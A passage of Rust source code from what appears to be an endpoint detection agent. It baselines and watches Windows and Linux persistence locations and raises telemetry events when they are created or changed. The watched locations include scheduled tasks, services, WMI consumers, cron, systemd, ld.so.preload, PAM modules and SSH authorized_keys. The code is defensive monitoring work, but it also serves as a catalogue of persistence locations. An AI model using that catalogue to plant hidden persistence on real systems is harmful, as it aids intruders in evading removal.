        for line in stdout.lines().skip(1) {
            let fields: Vec<&str> = line.split(',').collect();
            if fields.len() >= 9 {
                let name = fields[1].trim_matches('"').to_string();
                let command = fields[8].trim_matches('"').to_string();

                // Filter out common system tasks
                if !name.starts_with("\\Microsoft\\")
                    && !name.starts_with("\\Adobe\\")
                    && !name.starts_with("\\Google\\")
                    && !name.contains("OneDrive")
                    && !command.is_empty()
                {
                    tasks.push((name, command));
                }
            }
        }

        Ok(tasks)
    }

    #[cfg(target_os = "windows")]
    async fn monitor_scheduled_tasks_periodic(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
    ) {
        use std::time::Duration;

        let mut interval = tokio::time::interval(Duration::from_secs(30));

        loop {
            interval.tick().await;

            if let Ok(tasks) = Self::enumerate_scheduled_tasks().await {
                let mut entries = known_entries.write().await;

                for (name, command) in tasks {
                    let key = format!("ScheduledTask\\{}", name);
                    let is_new = !entries.contains_key(&key);
                    let is_modified = entries.get(&key).map(|v| v != &command).unwrap_or(false);

                    if is_new || is_modified {
                        let operation = if is_new { "create" } else { "modify" };

                        let (pid, process_name, process_path, cmdline, username) =
                            Self::get_recent_schtasks_process().await;

                        if let Some(event) = Self::create_persistence_event(
                            PersistenceType::ScheduledTask,
                            "TaskScheduler",
                            &name,
                            &command,
                            operation,
                            pid,
                            &process_name,
                            &process_path,
                            &cmdline,
                            &username,
                        ) {
                            let _ = tx.send(event).await;
                        }

                        entries.insert(key, command);
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn enumerate_services() -> Result<Vec<(String, String)>> {
        use winreg::enums::*;
        use winreg::RegKey;

        let mut services = Vec::new();
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);

        if let Ok(services_key) = hklm.open_subkey(r"SYSTEM\CurrentControlSet\Services") {
            for name in services_key.enum_keys().filter_map(|k| k.ok()) {
                if let Ok(service_key) = services_key.open_subkey(&name) {
                    // Get ImagePath
                    if let Ok(image_path) = service_key.get_value::<String, _>("ImagePath") {
                        // Filter to only include non-system services
                        let path_lower = image_path.to_lowercase();
                        if !path_lower.contains("\\windows\\system32\\")
                            && !path_lower.contains("\\windows\\syswow64\\")
                            && !image_path.is_empty()
                        {
                            services.push((name, image_path));
                        }
                    }
                }
            }
        }

        Ok(services)
    }

    #[cfg(target_os = "windows")]
    async fn monitor_services_periodic(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
    ) {
        use std::time::Duration;

        let mut interval = tokio::time::interval(Duration::from_secs(30));

        loop {
            interval.tick().await;

            if let Ok(services) = Self::enumerate_services().await {
                let mut entries = known_entries.write().await;

                for (name, path) in services {
                    let key = format!("Service\\{}", name);
                    let is_new = !entries.contains_key(&key);
                    let is_modified = entries.get(&key).map(|v| v != &path).unwrap_or(false);

                    if is_new || is_modified {
                        let operation = if is_new { "create" } else { "modify" };

                        let (pid, process_name, process_path, cmdline, username) =
                            Self::get_recent_sc_process().await;

                        if let Some(event) = Self::create_persistence_event(
                            PersistenceType::WindowsService,
                            "Services",
                            &name,
                            &path,
                            operation,
                            pid,
                            &process_name,
                            &process_path,
                            &cmdline,
                            &username,
                        ) {
                            let _ = tx.send(event).await;
                        }

                        entries.insert(key, path);
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn enumerate_wmi_subscriptions() -> Result<Vec<(String, String)>> {
        use std::process::Command;

        let mut subscriptions = Vec::new();

        // Query CommandLineEventConsumer
        let output = Command::new("wmic")
            .args([
                "/namespace:\\\\root\\subscription",
                "path",
                "CommandLineEventConsumer",
                "get",
                "Name,CommandLineTemplate",
                "/format:csv",
            ])
            .output()?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines().skip(2) {
            let fields: Vec<&str> = line.split(',').collect();
            if fields.len() >= 3 {
                let command = fields[1].trim().to_string();
                let name = fields[2].trim().to_string();
                if !name.is_empty() {
                    subscriptions.push((format!("CommandLine:{}", name), command));
                }
            }
        }

        // Query ActiveScriptEventConsumer
        let output = Command::new("wmic")
            .args([
                "/namespace:\\\\root\\subscription",
                "path",
                "ActiveScriptEventConsumer",
                "get",
                "Name,ScriptText",
                "/format:csv",
            ])
            .output()?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines().skip(2) {
            let fields: Vec<&str> = line.split(',').collect();
            if fields.len() >= 3 {
                let name = fields[1].trim().to_string();
                let script = fields[2].trim().to_string();
                if !name.is_empty() {
                    subscriptions.push((format!("Script:{}", name), script));
                }
            }
        }

        Ok(subscriptions)
    }

    #[cfg(target_os = "windows")]
    async fn monitor_wmi_periodic(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
    ) {
        use std::time::Duration;

        let mut interval = tokio::time::interval(Duration::from_secs(60));

        loop {
            interval.tick().await;

            if let Ok(subs) = Self::enumerate_wmi_subscriptions().await {
                let mut entries = known_entries.write().await;

                for (name, consumer) in subs {
                    let key = format!("WMI\\{}", name);
                    let is_new = !entries.contains_key(&key);
                    let is_modified = entries.get(&key).map(|v| v != &consumer).unwrap_or(false);

                    if is_new || is_modified {
                        let operation = if is_new { "create" } else { "modify" };

                        let (pid, process_name, process_path, cmdline, username) =
                            Self::get_recent_wmi_process().await;

                        if let Some(event) = Self::create_persistence_event(
                            PersistenceType::WmiSubscription,
                            "WMI\\root\\subscription",
                            &name,
                            &consumer,
                            operation,
                            pid,
                            &process_name,
                            &process_path,
                            &cmdline,
                            &username,
                        ) {
                            let _ = tx.send(event).await;
                        }

                        entries.insert(key, consumer);
                    }
                }
            }
        }
    }

    /// Get process that recently ran schtasks.exe
    #[cfg(target_os = "windows")]
    async fn get_recent_schtasks_process() -> (u32, String, String, String, String) {
        Self::find_recent_process_by_name(&[
            "schtasks.exe",
            "mmc.exe",
            "taskeng.exe",
            "powershell.exe",
        ])
        .await
    }

    /// Get process that recently ran sc.exe
    #[cfg(target_os = "windows")]
    async fn get_recent_sc_process() -> (u32, String, String, String, String) {
        Self::find_recent_process_by_name(&["sc.exe", "services.msc", "powershell.exe"]).await
    }

    /// Get process that recently used WMI
    #[cfg(target_os = "windows")]
    async fn get_recent_wmi_process() -> (u32, String, String, String, String) {
        Self::find_recent_process_by_name(&[
            "wmic.exe",
            "wmiprvse.exe",
            "powershell.exe",
            "mofcomp.exe",
        ])
        .await
    }

    /// Get the most recent process that might have modified something
    #[cfg(target_os = "windows")]
    async fn get_recent_modifying_process() -> (u32, String, String, String, String) {
        Self::find_recent_process_by_name(&["reg.exe", "regedit.exe", "powershell.exe", "cmd.exe"])
            .await
    }

    #[cfg(target_os = "windows")]
    async fn find_recent_process_by_name(names: &[&str]) -> (u32, String, String, String, String) {
        use sysinfo::{ProcessRefreshKind, System};

        let mut system = System::new();
        system.refresh_processes_specifics(ProcessRefreshKind::everything());

        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        // Find the most recent matching process (started within last 5 seconds)
        let mut best_match: Option<(u32, String, String, String, String, u64)> = None;

        for (pid, process) in system.processes() {
            let proc_name = process.name().to_lowercase();
            if names.iter().any(|n| proc_name.contains(&n.to_lowercase())) {
                let start_time = process.start_time();
                if start_time > now - 5 {
                    let cmdline = process.cmd().join(" ");
                    let path = process
                        .exe()
                        .map(|p| p.to_string_lossy().to_string())
                        .unwrap_or_default();

                    // Get username
                    let username = Self::get_process_username(pid.as_u32());

                    if best_match
                        .as_ref()
                        .map(|m| start_time > m.5)
                        .unwrap_or(true)
                    {
                        best_match = Some((
                            pid.as_u32(),
                            process.name().to_string(),
                            path,
                            cmdline,
                            username,
                            start_time,
                        ));
                    }
                }
            }
        }

        best_match
            .map(|(pid, name, path, cmdline, user, _)| (pid, name, path, cmdline, user))
            .unwrap_or_else(|| {
                let (pid, name, path) = Self::get_current_process_info();
                (pid, name, path, String::new(), whoami::username())
            })
    }

    #[cfg(target_os = "windows")]
    fn get_process_username(pid: u32) -> String {
        use windows::core::PCWSTR;
        use windows::Win32::Foundation::{CloseHandle, HANDLE};
        use windows::Win32::Security::{
            GetTokenInformation, LookupAccountSidW, TokenUser, SID_NAME_USE, TOKEN_QUERY,
            TOKEN_USER,
        };
        use windows::Win32::System::Threading::{
            OpenProcess, OpenProcessToken, PROCESS_QUERY_LIMITED_INFORMATION,
        };

        unsafe {
            let process_handle = match OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
                Ok(h) => h,
                Err(_) => return whoami::username(),
            };

            let mut token_handle = HANDLE::default();
            if OpenProcessToken(process_handle, TOKEN_QUERY, &mut token_handle).is_err() {
                let _ = CloseHandle(process_handle);
                return whoami::username();
            }

            let _ = CloseHandle(process_handle);

            let mut needed = 0u32;
            let _ = GetTokenInformation(token_handle, TokenUser, None, 0, &mut needed);

            if needed == 0 {
                let _ = CloseHandle(token_handle);
                return whoami::username();
            }

            let mut buffer = vec![0u8; needed as usize];
            if GetTokenInformation(
                token_handle,
                TokenUser,
                Some(buffer.as_mut_ptr() as *mut _),
                needed,
                &mut needed,
            )
            .is_err()
            {
                let _ = CloseHandle(token_handle);
                return whoami::username();
            }

            let _ = CloseHandle(token_handle);

            let token_user = &*(buffer.as_ptr() as *const TOKEN_USER);
            let sid = token_user.User.Sid;

            let mut name_buf = vec![0u16; 256];
            let mut domain_buf = vec![0u16; 256];
            let mut name_len = name_buf.len() as u32;
            let mut domain_len = domain_buf.len() as u32;
            let mut sid_type = SID_NAME_USE::default();

            if LookupAccountSidW(
                PCWSTR::null(),
                sid,
                windows::core::PWSTR(name_buf.as_mut_ptr()),
                &mut name_len,
                windows::core::PWSTR(domain_buf.as_mut_ptr()),
                &mut domain_len,
                &mut sid_type,
            )
            .is_ok()
            {
                let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
                let domain = String::from_utf16_lossy(&domain_buf[..domain_len as usize]);

                if domain.is_empty() {
                    name
                } else {
                    format!("{}\\{}", domain, name)
                }
            } else {
                whoami::username()
            }
        }
    }

    // ========================================================================
    // Linux Implementation
    // ========================================================================

    #[cfg(target_os = "linux")]
    async fn baseline_linux(known_entries: &Arc<tokio::sync::RwLock<HashMap<String, String>>>) {
        let mut entries = known_entries.write().await;

        // Crontab files
        Self::baseline_crontabs(&mut entries);

        // Systemd services
        Self::baseline_systemd(&mut entries);

        // Init scripts
        Self::baseline_init_scripts(&mut entries);

        // Shell profiles
        Self::baseline_shell_profiles(&mut entries);

        // LD_PRELOAD
        Self::baseline_ld_preload(&mut entries);

        // PAM modules
        Self::baseline_pam_modules(&mut entries);

        // SSH authorized_keys
        Self::baseline_ssh_keys(&mut entries);

        // At jobs
        Self::baseline_at_jobs(&mut entries);

        // XDG autostart
        Self::baseline_xdg_autostart(&mut entries);

        // Udev rules
        Self::baseline_udev_rules(&mut entries);

        // Kernel modules
        Self::baseline_kernel_modules(&mut entries);

        debug!(count = entries.len(), "Linux baseline scan complete");
    }

    #[cfg(target_os = "linux")]
    fn baseline_crontabs(entries: &mut HashMap<String, String>) {
        let crontab_paths = vec![
            "/etc/crontab",
            "/etc/cron.d",
            "/etc/cron.daily",
            "/etc/cron.hourly",
            "/etc/cron.weekly",
            "/etc/cron.monthly",
            "/var/spool/cron/crontabs",
            "/var/spool/cron",
            "/etc/anacrontab",
        ];

        for path in crontab_paths {
            if let Ok(metadata) = std::fs::metadata(path) {
                if metadata.is_dir() {
                    if let Ok(dir_entries) = std::fs::read_dir(path) {
                        for entry in dir_entries.flatten() {
                            let file_path = entry.path();
                            if let Ok(content) = std::fs::read_to_string(&file_path) {
                                let key = file_path.to_string_lossy().to_string();
                                let hash = Self::hash_content(&content);
                                entries.insert(key, hash);
                            }
                        }
                    }
                } else if let Ok(content) = std::fs::read_to_string(path) {
                    let hash = Self::hash_content(&content);
                    entries.insert(path.to_string(), hash);
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_systemd(entries: &mut HashMap<String, String>) {
        let systemd_paths = vec![
            "/etc/systemd/system",
            "/usr/lib/systemd/system",
            "/lib/systemd/system",
            "/run/systemd/system",
            "/etc/systemd/user",
            "/usr/lib/systemd/user",
        ];

        for path in systemd_paths {
            if let Ok(dir_entries) = std::fs::read_dir(path) {
                for entry in dir_entries.flatten() {
                    let file_path = entry.path();
                    let file_name = file_path
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_default();

                    if file_name.ends_with(".service") || file_name.ends_with(".timer") {
                        if let Ok(content) = std::fs::read_to_string(&file_path) {
                            let key = file_path.to_string_lossy().to_string();
                            let hash = Self::hash_content(&content);
                            entries.insert(key, hash);
                        }
                    }
                }
            }
        }

        // User systemd services
        if let Ok(home) = std::env::var("HOME") {
            let user_systemd = format!("{}/.config/systemd/user", home);
            if let Ok(dir_entries) = std::fs::read_dir(&user_systemd) {
                for entry in dir_entries.flatten() {
                    let file_path = entry.path();
                    if let Ok(content) = std::fs::read_to_string(&file_path) {
                        let key = file_path.to_string_lossy().to_string();
                        let hash = Self::hash_content(&content);
                        entries.insert(key, hash);
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_init_scripts(entries: &mut HashMap<String, String>) {
        let init_paths = vec![
            "/etc/init.d",
            "/etc/rc.local",
            "/etc/rc.d",
            "/etc/init",
            "/etc/rc0.d",
            "/etc/rc1.d",
            "/etc/rc2.d",
            "/etc/rc3.d",
            "/etc/rc4.d",
            "/etc/rc5.d",
            "/etc/rc6.d",
        ];

        for path in init_paths {
            if let Ok(metadata) = std::fs::metadata(path) {
                if metadata.is_dir() {
                    if let Ok(dir_entries) = std::fs::read_dir(path) {
                        for entry in dir_entries.flatten() {
                            let file_path = entry.path();
                            if let Ok(content) = std::fs::read_to_string(&file_path) {
                                let key = file_path.to_string_lossy().to_string();
                                let hash = Self::hash_content(&content);
                                entries.insert(key, hash);
                            }
                        }
                    }
                } else if let Ok(content) = std::fs::read_to_string(path) {
                    let hash = Self::hash_content(&content);
                    entries.insert(path.to_string(), hash);
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_shell_profiles(entries: &mut HashMap<String, String>) {
        let system_profiles = vec![
            "/etc/profile",
            "/etc/profile.d",
            "/etc/bash.bashrc",
            "/etc/bashrc",
            "/etc/zshrc",
            "/etc/zsh/zshrc",
            "/etc/environment",
            "/etc/bash_completion.d",
        ];

        for path in system_profiles {
            if let Ok(metadata) = std::fs::metadata(path) {
                if metadata.is_dir() {
                    if let Ok(dir_entries) = std::fs::read_dir(path) {
                        for entry in dir_entries.flatten() {
                            let file_path = entry.path();
                            if let Ok(content) = std::fs::read_to_string(&file_path) {
                                let key = file_path.to_string_lossy().to_string();
                                let hash = Self::hash_content(&content);
                                entries.insert(key, hash);
                            }
                        }
                    }
                } else if let Ok(content) = std::fs::read_to_string(path) {
                    let hash = Self::hash_content(&content);
                    entries.insert(path.to_string(), hash);
                }
            }
        }

        // User profiles
        let user_profiles = vec![
            ".bashrc",
            ".bash_profile",
            ".bash_login",
            ".profile",
            ".zshrc",
            ".zprofile",
            ".zlogin",
            ".zshenv",
        ];

        // Scan home directories
        if let Ok(dir_entries) = std::fs::read_dir("/home") {
            for entry in dir_entries.flatten() {
                let home_path = entry.path();
                for profile in &user_profiles {
                    let profile_path = home_path.join(profile);
                    if let Ok(content) = std::fs::read_to_string(&profile_path) {
                        let key = profile_path.to_string_lossy().to_string();
                        let hash = Self::hash_content(&content);
                        entries.insert(key, hash);
                    }
                }
            }
        }

        // Root's profiles
        for profile in &user_profiles {
            let profile_path = PathBuf::from("/root").join(profile);
            if let Ok(content) = std::fs::read_to_string(&profile_path) {
                let key = profile_path.to_string_lossy().to_string();
                let hash = Self::hash_content(&content);
                entries.insert(key, hash);
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_ld_preload(entries: &mut HashMap<String, String>) {
        // /etc/ld.so.preload - CRITICAL persistence location
        if let Ok(content) = std::fs::read_to_string("/etc/ld.so.preload") {
            let hash = Self::hash_content(&content);
            entries.insert("/etc/ld.so.preload".to_string(), hash);
        }

        // /etc/ld.so.conf
        if let Ok(content) = std::fs::read_to_string("/etc/ld.so.conf") {
            let hash = Self::hash_content(&content);
            entries.insert("/etc/ld.so.conf".to_string(), hash);
        }

        // /etc/ld.so.conf.d/
        if let Ok(dir_entries) = std::fs::read_dir("/etc/ld.so.conf.d") {
            for entry in dir_entries.flatten() {
                let file_path = entry.path();
                if let Ok(content) = std::fs::read_to_string(&file_path) {
                    let key = file_path.to_string_lossy().to_string();
                    let hash = Self::hash_content(&content);
                    entries.insert(key, hash);
                }
            }
        }

        // Check LD_PRELOAD environment
        if let Ok(ld_preload) = std::env::var("LD_PRELOAD") {
            entries.insert("ENV:LD_PRELOAD".to_string(), ld_preload);
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_pam_modules(entries: &mut HashMap<String, String>) {
        let pam_paths = vec![
            "/etc/pam.d",
            "/etc/pam.conf",
            "/lib/security",
            "/lib64/security",
            "/usr/lib/security",
            "/usr/lib64/security",
            "/lib/x86_64-linux-gnu/security",
        ];

        for path in pam_paths {
            if let Ok(metadata) = std::fs::metadata(path) {
                if metadata.is_dir() {
                    if let Ok(dir_entries) = std::fs::read_dir(path) {
                        for entry in dir_entries.flatten() {
                            let file_path = entry.path();
                            let file_name = file_path
                                .file_name()
                                .map(|n| n.to_string_lossy().to_string())
                                .unwrap_or_default();

                            // PAM config files
                            if path.contains("pam.d") {
                                if let Ok(content) = std::fs::read_to_string(&file_path) {
                                    let key = file_path.to_string_lossy().to_string();
                                    let hash = Self::hash_content(&content);
                                    entries.insert(key, hash);
                                }
                            }
                            // PAM module .so files
                            else if file_name.ends_with(".so") {
                                if let Ok(metadata) = std::fs::metadata(&file_path) {
                                    let key = file_path.to_string_lossy().to_string();
                                    let value = format!(
                                        "size:{}:mtime:{}",
                                        metadata.len(),
                                        metadata
                                            .modified()
                                            .map(|t| t
                                                .duration_since(std::time::UNIX_EPOCH)
                                                .unwrap_or_default()
                                                .as_secs())
                                            .unwrap_or(0)
                                    );
                                    entries.insert(key, value);
                                }
                            }
                        }
                    }
                } else if let Ok(content) = std::fs::read_to_string(path) {
                    let hash = Self::hash_content(&content);
                    entries.insert(path.to_string(), hash);
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_ssh_keys(entries: &mut HashMap<String, String>) {
        // System SSH config
        if let Ok(content) = std::fs::read_to_string("/etc/ssh/sshd_config") {
            let hash = Self::hash_content(&content);
            entries.insert("/etc/ssh/sshd_config".to_string(), hash);
        }

        if let Ok(content) = std::fs::read_to_string("/etc/ssh/ssh_config") {
            let hash = Self::hash_content(&content);
            entries.insert("/etc/ssh/ssh_config".to_string(), hash);
        }

        let ssh_files = vec!["authorized_keys", "authorized_keys2"];

        // Scan home directories
        if let Ok(dir_entries) = std::fs::read_dir("/home") {
            for entry in dir_entries.flatten() {
                let ssh_dir = entry.path().join(".ssh");
                for ssh_file in &ssh_files {
                    let key_path = ssh_dir.join(ssh_file);
                    if let Ok(content) = std::fs::read_to_string(&key_path) {
                        let key = key_path.to_string_lossy().to_string();
                        let hash = Self::hash_content(&content);
                        entries.insert(key, hash);
                    }
                }
            }
        }

        // Root's SSH
        for ssh_file in &ssh_files {
            let key_path = PathBuf::from("/root/.ssh").join(ssh_file);
            if let Ok(content) = std::fs::read_to_string(&key_path) {
                let key = key_path.to_string_lossy().to_string();
                let hash = Self::hash_content(&content);
                entries.insert(key, hash);
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_at_jobs(entries: &mut HashMap<String, String>) {
        let at_dirs = vec![
            "/var/spool/at",
            "/var/spool/atjobs",
            "/var/spool/cron/atjobs",
        ];

        for dir in at_dirs {
            if let Ok(dir_entries) = std::fs::read_dir(dir) {
                for entry in dir_entries.flatten() {
                    let file_path = entry.path();
                    if let Ok(content) = std::fs::read_to_string(&file_path) {
                        let key = file_path.to_string_lossy().to_string();
                        let hash = Self::hash_content(&content);
                        entries.insert(key, hash);
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_xdg_autostart(entries: &mut HashMap<String, String>) {
        let xdg_paths = vec![
            "/etc/xdg/autostart",
            "/usr/share/autostart",
            "/usr/share/gnome/autostart",
        ];

        for path in xdg_paths {
            if let Ok(dir_entries) = std::fs::read_dir(path) {
                for entry in dir_entries.flatten() {
                    let file_path = entry.path();
                    if file_path
                        .extension()
                        .map(|e| e == "desktop")
                        .unwrap_or(false)
                    {
                        if let Ok(content) = std::fs::read_to_string(&file_path) {
                            let key = file_path.to_string_lossy().to_string();
                            let hash = Self::hash_content(&content);
                            entries.insert(key, hash);
                        }
                    }
                }
            }
        }

        // User autostart directories
        if let Ok(dir_entries) = std::fs::read_dir("/home") {
            for entry in dir_entries.flatten() {
                let autostart_dir = entry.path().join(".config/autostart");
                if let Ok(files) = std::fs::read_dir(&autostart_dir) {
                    for file in files.flatten() {
                        let file_path = file.path();
                        if file_path
                            .extension()
                            .map(|e| e == "desktop")
                            .unwrap_or(false)
                        {
                            if let Ok(content) = std::fs::read_to_string(&file_path) {
                                let key = file_path.to_string_lossy().to_string();
                                let hash = Self::hash_content(&content);
                                entries.insert(key, hash);
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_udev_rules(entries: &mut HashMap<String, String>) {
        let udev_paths = vec![
            "/etc/udev/rules.d",
            "/lib/udev/rules.d",
            "/usr/lib/udev/rules.d",
            "/run/udev/rules.d",
        ];

        for path in udev_paths {
            if let Ok(dir_entries) = std::fs::read_dir(path) {
                for entry in dir_entries.flatten() {
                    let file_path = entry.path();
                    if file_path.extension().map(|e| e == "rules").unwrap_or(false) {
                        if let Ok(content) = std::fs::read_to_string(&file_path) {
                            let key = file_path.to_string_lossy().to_string();
                            let hash = Self::hash_content(&content);
                            entries.insert(key, hash);
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn baseline_kernel_modules(entries: &mut HashMap<String, String>) {
        // Track loaded modules
        if let Ok(content) = std::fs::read_to_string("/proc/modules") {
            for line in content.lines() {
                if let Some(module_name) = line.split_whitespace().next() {
                    entries.insert(format!("module:{}", module_name), "loaded".to_string());
                }
            }
        }

        // Track module configuration
        let module_paths = vec![
            "/etc/modules",
            "/etc/modules-load.d",
            "/usr/lib/modules-load.d",
            "/etc/modprobe.d",
            "/lib/modprobe.d",
        ];

        for path in module_paths {
            if let Ok(metadata) = std::fs::metadata(path) {
                if metadata.is_dir() {
                    if let Ok(dir_entries) = std::fs::read_dir(path) {
                        for entry in dir_entries.flatten() {
                            let file_path = entry.path();
                            if let Ok(content) = std::fs::read_to_string(&file_path) {
                                let key = file_path.to_string_lossy().to_string();
                                let hash = Self::hash_content(&content);
                                entries.insert(key, hash);
                            }
                        }
                    }
                } else if let Ok(content) = std::fs::read_to_string(path) {
                    let hash = Self::hash_content(&content);
                    entries.insert(path.to_string(), hash);
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    async fn start_linux_monitors(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
        config: AgentConfig,
    ) {
        // Use inotify for real-time file monitoring
        let paths_to_watch: Vec<(&str, PersistenceType)> = vec![
            // Crontab locations
            ("/etc/crontab", PersistenceType::Crontab),
            ("/etc/cron.d", PersistenceType::Crontab),
            ("/etc/cron.daily", PersistenceType::Crontab),
            ("/etc/cron.hourly", PersistenceType::Crontab),
            ("/var/spool/cron/crontabs", PersistenceType::Crontab),
            ("/var/spool/cron", PersistenceType::Crontab),
            ("/etc/anacrontab", PersistenceType::Anacron),
            // Systemd
            ("/etc/systemd/system", PersistenceType::SystemdService),
            ("/etc/systemd/user", PersistenceType::SystemdService),
            ("/run/systemd/system", PersistenceType::SystemdService),
            // Init scripts
            ("/etc/init.d", PersistenceType::InitScript),
            ("/etc/rc.local", PersistenceType::RcLocal),
            // Shell profiles
            ("/etc/profile", PersistenceType::ShellProfile),
            ("/etc/profile.d", PersistenceType::ShellProfile),
            ("/etc/bash.bashrc", PersistenceType::ShellProfile),
            ("/etc/bashrc", PersistenceType::ShellProfile),
            ("/etc/environment", PersistenceType::ShellProfile),
            // LD preload - CRITICAL
            ("/etc/ld.so.preload", PersistenceType::LdSoPreload),
            ("/etc/ld.so.conf", PersistenceType::LdSoConf),
            ("/etc/ld.so.conf.d", PersistenceType::LdSoConf),
            // PAM
            ("/etc/pam.d", PersistenceType::PamModule),
            ("/lib/security", PersistenceType::PamModule),
            ("/lib64/security", PersistenceType::PamModule),
            // SSH
            ("/etc/ssh/sshd_config", PersistenceType::SshAuthorizedKey),
            // Udev rules
            ("/etc/udev/rules.d", PersistenceType::UdevRule),
            // Kernel modules config
            ("/etc/modules", PersistenceType::KernelModule),
            ("/etc/modules-load.d", PersistenceType::KernelModule),
            ("/etc/modprobe.d", PersistenceType::KernelModule),
            // At jobs
            ("/var/spool/at", PersistenceType::AtJob),
            // XDG autostart
            ("/etc/xdg/autostart", PersistenceType::XdgAutostart),
            // MOTD
            ("/etc/update-motd.d", PersistenceType::MotdScript),
        ];

        // Start inotify watcher
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        let paths_clone: Vec<_> = paths_to_watch
            .iter()
            .map(|(p, t)| (p.to_string(), t.clone()))
            .collect();

        tokio::spawn(async move {
            Self::linux_inotify_monitor(tx_clone, known_entries_clone, paths_clone).await;
        });

        // Monitor user home directories for profile changes
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        tokio::spawn(async move {
            Self::monitor_user_profiles(tx_clone, known_entries_clone).await;
        });

        // Monitor SSH authorized_keys in home directories
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        tokio::spawn(async move {
            Self::monitor_ssh_keys(tx_clone, known_entries_clone).await;
        });

        // Periodic kernel module check
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        tokio::spawn(async move {
            Self::monitor_kernel_modules_periodic(tx_clone, known_entries_clone).await;
        });

        info!("Linux persistence monitors started");
    }

    #[cfg(target_os = "linux")]
    async fn linux_inotify_monitor(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
        paths: Vec<(String, PersistenceType)>,
    ) {
        use notify::{Event, EventKind, RecursiveMode, Watcher};

        let (notify_tx, mut notify_rx) = tokio::sync::mpsc::channel(1000);

        let mut watcher = match notify::recommended_watcher(move |res: notify::Result<Event>| {
            if let Ok(event) = res {
                let _ = notify_tx.blocking_send(event);
            }
        }) {
            Ok(w) => w,
            Err(e) => {
                error!(error = %e, "Failed to create inotify watcher");
                return;
            }
        };

        // Build a map of paths to persistence types
        let mut path_type_map: HashMap<String, PersistenceType> = HashMap::new();

        for (path, ptype) in &paths {
            let p = Path::new(path);
            if p.exists() {
                let mode = if p.is_dir() {
                    RecursiveMode::Recursive
                } else {
                    RecursiveMode::NonRecursive
                };

                if let Err(e) = watcher.watch(p, mode) {
                    warn!(path = %path, error = %e, "Failed to watch path");
                } else {
                    debug!(path = %path, "Watching for persistence changes");
                }
            }
            path_type_map.insert(path.to_string(), ptype.clone());
        }

        while let Some(event) = notify_rx.recv().await {
            for path in &event.paths {
                let path_str = path.to_string_lossy().to_string();

                let operation = match event.kind {
                    EventKind::Create(_) => "create",
                    EventKind::Modify(_) => "modify",
                    EventKind::Remove(_) => "delete",
                    _ => continue,
                };

                // Determine persistence type from path
                let ptype = path_type_map
                    .iter()
                    .find(|(prefix, _)| path_str.starts_with(*prefix))
                    .map(|(_, t)| t.clone())
                    .unwrap_or_else(|| Self::determine_linux_persistence_type(&path_str));

                // Read content if it's a file
                let content = if path.is_file() {
                    std::fs::read_to_string(path).ok()
                } else {
                    None
                };

                let value = content
                    .as_ref()
                    .map(|c| Self::extract_suspicious_content(c))
                    .unwrap_or_else(|| path_str.clone());

                // Get process info
                let (pid, process_name, process_path) = Self::get_current_process_info();
                let username = whoami::username();

                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();
                let location = path
                    .parent()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();

                // Calculate hash for files
                let payload_hash = if path.is_file() {
                    Self::calculate_file_hash(&path_str).await.ok()
                } else {
                    None
                };

                if let Some(event) = Self::create_persistence_event_with_hash(
                    ptype,
                    &location,
                    &name,
                    &value,
                    operation,
                    pid,
                    &process_name,
                    &process_path,
                    "",
                    &username,
                    payload_hash,
                ) {
                    let _ = tx.send(event).await;
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn determine_linux_persistence_type(path: &str) -> PersistenceType {
        let path_lower = path.to_lowercase();

        if path_lower.contains("cron") || path_lower.contains("anacron") {
            if path_lower.contains("anacron") {
                PersistenceType::Anacron
            } else {
                PersistenceType::Crontab
            }
        } else if path_lower.contains("systemd") {
            if path_lower.ends_with(".timer") {
                PersistenceType::SystemdTimer
            } else {
                PersistenceType::SystemdService
            }
        } else if path_lower.contains("init.d") || path_lower.contains("rc.") {
            if path_lower.contains("rc.local") {
                PersistenceType::RcLocal
            } else {
                PersistenceType::InitScript
            }
        } else if path_lower.contains("profile")
            || path_lower.contains("bashrc")
            || path_lower.contains("zshrc")
        {
            PersistenceType::ShellProfile
        } else if path_lower.contains("ld.so.preload") {
            PersistenceType::LdSoPreload
        } else if path_lower.contains("ld.so.conf") {
            PersistenceType::LdSoConf
        } else if path_lower.contains("pam") {
            PersistenceType::PamModule
        } else if path_lower.contains("ssh") || path_lower.contains("authorized_keys") {
